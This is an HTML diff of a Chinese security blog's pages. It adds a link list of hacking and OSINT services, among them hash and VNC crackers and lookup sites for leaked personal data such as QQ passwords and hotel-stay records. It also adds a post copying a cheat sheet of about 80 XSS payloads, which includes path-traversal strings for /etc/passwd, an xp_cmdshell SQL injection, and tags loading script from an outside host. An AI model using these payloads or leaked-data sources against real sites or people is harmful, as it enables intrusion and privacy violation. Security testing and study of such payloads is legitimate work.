+<p><a href="https://github.com/Veil-Framework/Veil-Evasion/（Veil-Evasion免杀项目）" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion/（Veil-Evasion免杀项目）</a></p>
+<p><a href="https://github.com/x3omdax/PenBox（安全测试框架）" target="_blank" rel="noopener">https://github.com/x3omdax/PenBox（安全测试框架）</a></p>
+<p><a href="https://github.com/SecWiki（安全文库）" target="_blank" rel="noopener">https://github.com/SecWiki（安全文库）</a></p>
+<p>在线常用工具：<br><a href="http://ip.fbisb.com/(真实IP地址查询地址" target="_blank" rel="noopener">http://ip.fbisb.com/(真实IP地址查询地址</a>)</p>
+<p><a href="https://phpinfo.me/domain/（子域名在线爆破）" target="_blank" rel="noopener">https://phpinfo.me/domain/（子域名在线爆破）</a></p>
+<p><a href="http://www.bugbank.cn/dscan/index.html（在线子域名爆破）" target="_blank" rel="noopener">http://www.bugbank.cn/dscan/index.html（在线子域名爆破）</a></p>
+<p><a href="https://phpinfo.me/bing.php（在线c段查询）" target="_blank" rel="noopener">https://phpinfo.me/bing.php（在线c段查询）</a></p>
+<p><a href="https://dnsdb.io/zh-cn/(在线C段查询2）" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/(在线C段查询2）</a></p>
+<p><a href="http://www.yopmail.com/zh/（一次性使用邮箱）" target="_blank" rel="noopener">http://www.yopmail.com/zh/（一次性使用邮箱）</a></p>
+<p><a href="http://objectif-securite.ch/(LM破解）" target="_blank" rel="noopener">http://objectif-securite.ch/(LM破解）</a></p>
+<p><a href="https://www.mailinator.com/（一次性使用邮箱）" target="_blank" rel="noopener">https://www.mailinator.com/（一次性使用邮箱）</a></p>
+<p><a href="http://tools88.com/safe/vnc.php（在线VNC破解）" target="_blank" rel="noopener">http://tools88.com/safe/vnc.php（在线VNC破解）</a></p>
+<p><a href="https://www.hashkiller.co.uk/（在线hash破解）" target="_blank" rel="noopener">https://www.hashkiller.co.uk/（在线hash破解）</a></p>
+<p><a href="http://tool.chacuo.net/cryptdes（在线解密加密）" target="_blank" rel="noopener">http://tool.chacuo.net/cryptdes（在线解密加密）</a></p>
+<p><a href="http://www.xssed.com/（xssed平台）" target="_blank" rel="noopener">http://www.xssed.com/（xssed平台）</a></p>
+<p><a href="http://xss.cnit.pro/（cnitxss平台" target="_blank" rel="noopener">http://xss.cnit.pro/（cnitxss平台</a>)</p>
+<p><a href="http://www.objectif-securite.ch/（在线LMHASH破解）" target="_blank" rel="noopener">http://www.objectif-securite.ch/（在线LMHASH破解）</a></p>
+<p><a href="http://toolbar.netcraft.com（很好的域名搜索引擎）" target="_blank" rel="noopener">http://toolbar.netcraft.com（很好的域名搜索引擎）</a></p>
+<p><a href="http://who.is" target="_blank" rel="noopener">http://who.is</a> （ 域名解析记录很好使）</p>
+<p><a href="https://cirt.net/passwords(常用设备密码字典" target="_blank" rel="noopener">https://cirt.net/passwords(常用设备密码字典</a>)</p>
+<p><a href="http://www.webscantest.com/datastore/(web在线测试练习" target="_blank" rel="noopener">http://www.webscantest.com/datastore/(web在线测试练习</a>)</p>
+<p><a href="http://www.pinchins.cn/Tools.aspx?ch=Tools(勒索病毒解密工具" target="_blank" rel="noopener">http://www.pinchins.cn/Tools.aspx?ch=Tools(勒索病毒解密工具</a>)</p>
+<p>国内社工裤：<br><a href="http://cha.hx99.net/（华西社工库）" target="_blank" rel="noopener">http://cha.hx99.net/（华西社工库）</a></p>
+<p><a href="http://s.70sec.com/（70sec社工库）" target="_blank" rel="noopener">http://s.70sec.com/（70sec社工库）</a></p>
+<p><a href="http://so.moonsec.com/index.php（暗月社工库）" target="_blank" rel="noopener">http://so.moonsec.com/index.php（暗月社工库）</a></p>
+<p><a href="http://qq.findmima.com/(qq密码" target="_blank" rel="noopener">http://qq.findmima.com/(qq密码</a>)</p>
+<p><a href="http://www.ckaifang.com/（查开房数据库）" target="_blank" rel="noopener">http://www.ckaifang.com/（查开房数据库）</a></p>
+<p><a href="https://boy.findmima.com/" target="_blank" rel="noopener">https://boy.findmima.com/</a> （查找密码社工库）</p>
+<p><a href="http://163.donothackme.club/(163邮箱社工库" target="_blank" rel="noopener">http://163.donothackme.club/(163邮箱社工库</a>)</p>
+<p>国外社工裤：<br><a href="https://www.instantcheckmate.com/" target="_blank" rel="noopener">https://www.instantcheckmate.com/</a></p>
+<p><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">https://haveibeenpwned.com/</a></p>
+<p>联合账号查询：<br><a href="http://reg007.com" target="_blank" rel="noopener">http://reg007.com</a> （查询邮箱已注册过的网址）</p>
+<p><a href="http://www.zhaohuini.com/（找回密码）" target="_blank" rel="noopener">http://www.zhaohuini.com/（找回密码）</a></p>
+<p><a href="http://qun.findmima.com/（群关系）" target="_blank" rel="noopener">http://qun.findmima.com/（群关系）</a></p>
+<p><a href="http://toolsapp.duapp.com/randpw.html（反社工随机密码）" target="_blank" rel="noopener">http://toolsapp.duapp.com/randpw.html（反社工随机密码）</a></p>
+<p><a href="https://www.trustasia.com/tools/ccs-checker/" target="_blank" rel="noopener">https://www.trustasia.com/tools/ccs-checker/</a> （css漏洞检查）</p>
+<p><a href="http://www.bejson.com/" target="_blank" rel="noopener">http://www.bejson.com/</a> （json在线验证）</p>
+<p>大数据以及端口服务查询：<br><a href="https://www.zoomeye.org/（钟道之眼）" target="_blank" rel="noopener">https://www.zoomeye.org/（钟道之眼）</a></p>
+<p><a href="https://www.shodan.io/（shodan查询）" target="_blank" rel="noopener">https://www.shodan.io/（shodan查询）</a></p>
+<p><a href="https://www.oshadan.com/（osshadan查询）" target="_blank" rel="noopener">https://www.oshadan.com/（osshadan查询）</a></p>
+<p><a href="https://www.censys.io/（censys查询）" target="_blank" rel="noopener">https://www.censys.io/（censys查询）</a></p>
+<p><a href="http://cn.bing.com/" target="_blank" rel="noopener">http://cn.bing.com/</a> (必应查询)</p>
+<p><a href="https://searchcode.com/（代码泄露）" target="_blank" rel="noopener">https://searchcode.com/（代码泄露）</a></p>
+<p>CDN查找真实的多ping:<br><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p>
+<p><a href="http://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">http://www.cdnplanet.com/tools/cdnfinder/</a></p>
+<p><a href="http://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report</a></p>
+<p><a href="http://viewdns.info/iphistory/?domain=" target="_blank" rel="noopener">http://viewdns.info/iphistory/?domain=</a></p>
+<p><a href="http://www.hosterstats.com/historicaldns.php" target="_blank" rel="noopener">http://www.hosterstats.com/historicaldns.php</a></p>
+<p><a href="http://whoisrequest.com/history/" target="_blank" rel="noopener">http://whoisrequest.com/history/</a></p>
+<p><a href="http://map.norsecorp.com/#/" target="_blank" rel="noopener">http://map.norsecorp.com/#/</a></p>
+<p><a href="http://crimeflare.com（查cloudflare真实ip百试不爽）" target="_blank" rel="noopener">http://crimeflare.com（查cloudflare真实ip百试不爽）</a></p>
+<p>常用web在线工具：<br><a href="http://tool.chinaz.com/(站长工具）" target="_blank" rel="noopener">http://tool.chinaz.com/(站长工具）</a></p>
+<p><a href="http://whatweb.net/（网站指纹查询）" target="_blank" rel="noopener">http://whatweb.net/（网站指纹查询）</a></p>
+<p><a href="https://www.t00ls.net/domain.html（t00ls工具）" target="_blank" rel="noopener">https://www.t00ls.net/domain.html（t00ls工具）</a></p>
+<p>MD5在线检查：<br><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a></p>
+<p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p>
+<p><a href="http://www.xmd5.com/" target="_blank" rel="noopener">http://www.xmd5.com/</a></p>
+<p><a href="http://pmd5.com/" target="_blank" rel="noopener">http://pmd5.com/</a></p>
+<p><a href="https://www.hashkill.com/" target="_blank" rel="noopener">https://www.hashkill.com/</a></p>
+<p><a href="https://md5db.net/decrypt" target="_blank" rel="noopener">https://md5db.net/decrypt</a></p>
+<p><a href="http://www.dmd5.com/" target="_blank" rel="noopener">http://www.dmd5.com/</a></p>
+<p><a href="http://www.xmd5.org/" target="_blank" rel="noopener">http://www.xmd5.org/</a></p>
+<p><a href="http://md5decryption.com/" target="_blank" rel="noopener">http://md5decryption.com/</a></p>
+<p><a href="http://www.chamd5.org/" target="_blank" rel="noopener">http://www.chamd5.org/</a></p>
+<p><a href="http://hash-killer.com/" target="_blank" rel="noopener">http://hash-killer.com/</a></p>
+<p><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a></p>
+<p><a href="http://hashchecker.de/find.html" target="_blank" rel="noopener">http://hashchecker.de/find.html</a></p>
+<p><a href="http://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/ophcrack.php</a></p>
+<p><a href="http://www.md5decrypter.com/" target="_blank" rel="noopener">http://www.md5decrypter.com/</a></p>
+<p><a href="http://www.md5this.com/latest.html" target="_blank" rel="noopener">http://www.md5this.com/latest.html</a></p>
+<p><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></p>
+<p><a href="http://freerainbowtables.mirror.garr.it/mirrors/freerainbowtables/md5/(彩虹表" target="_blank" rel="noopener">http://freerainbowtables.mirror.garr.it/mirrors/freerainbowtables/md5/(彩虹表</a>)</p>
+<p><a href="http://md5.gromweb.com/" target="_blank" rel="noopener">http://md5.gromweb.com/</a></p>
+<p><a href="http://md5online.org/" target="_blank" rel="noopener">http://md5online.org/</a></p>
+<p><a href="http://tw.freemd5.com/" target="_blank" rel="noopener">http://tw.freemd5.com/</a></p>
+<p><a href="http://www.md5.cc/" target="_blank" rel="noopener">http://www.md5.cc/</a></p>
+<p><a href="http://hashtoolkit.com/" target="_blank" rel="noopener">http://hashtoolkit.com/</a></p>
+<p><a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank" rel="noopener">https://hashkiller.co.uk/md5-decrypter.aspx</a></p>
+<p><a href="http://neeao.com/tools/decode/index_eval.php（gzinflate解密）" target="_blank" rel="noopener">http://neeao.com/tools/decode/index_eval.php（gzinflate解密）</a></p>
+<p>在线病毒检测：<br><a href="http://appscan.360.cn/" target="_blank" rel="noopener">http://appscan.360.cn/</a> （安卓检测）</p>
+<p><a href="https://b-chao.com/" target="_blank" rel="noopener">https://b-chao.com/</a> （安卓检测）</p>
+<p><a href="https://malwr.com/submission/" target="_blank" rel="noopener">https://malwr.com/submission/</a> （病毒分析）</p>
+<p><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a> （病毒分析2）</p>
+<p><a href="http://virusview.net/search/inde（病毒查询" target="_blank" rel="noopener">http://virusview.net/search/inde（病毒查询</a> ）</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/24/XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/24/XSS/" itemprop="url">XSS常见口令</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-24T23:01:03+08:00">
+                2018-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>强网杯真的好强、、、小白还需努力~做题到现在也没有思路<br>转自别人的博客，为了以后方便拿过来啦哈哈<br>转自：<a href="https://www.jianshu.com/p/01377ad556f0" target="_blank" rel="noopener">https://www.jianshu.com/p/01377ad556f0</a><br>下面开始贴代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"> =&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line"> %3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line"> &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line"> &lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> %0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line"> %22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"> %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line"> %3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"> %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"> %3f.jsp</span><br><span class="line"> %3f.jsp</span><br><span class="line"> &lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line"> ?sql_debug=1</span><br><span class="line"> a%5c.aspx</span><br><span class="line"> a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line"> a/</span><br><span class="line"> a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line"> &quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line"> &apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;</span><br><span class="line"> %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"> %3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"> %3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"> &lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line"> &lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line"> &lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;</span><br><span class="line"> &lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line"> &lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line"> &lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line"> &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line"> &lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> &lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line"> &lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> &lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> &lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line"> &lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line"> &lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line"> &lt;IMG src=&quot;mocha:[code]&quot;&gt;</span><br><span class="line"> &lt;IMG src=&quot;livescript:[code]&quot;&gt;</span><br><span class="line"> &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;</span><br><span class="line"> &lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line"> &lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line"> &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line"> &lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;</span><br><span class="line"> &lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line"> &lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line"> &lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line"> &lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line"> &lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line"> &lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line"> &lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line"> getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)</span><br><span class="line"> a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);</span><br><span class="line"> &lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line"> &quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line"> &lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line"> &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line"> &lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line"> &lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line"> &lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br><span class="line"></span><br><span class="line">作者：carsonsoding</span><br><span class="line">链接：https://www.jianshu.com/p/01377ad556f0</span><br><span class="line">來源：简书</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
 
   
   <nav class="pagination">
     <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
-
 
 
 
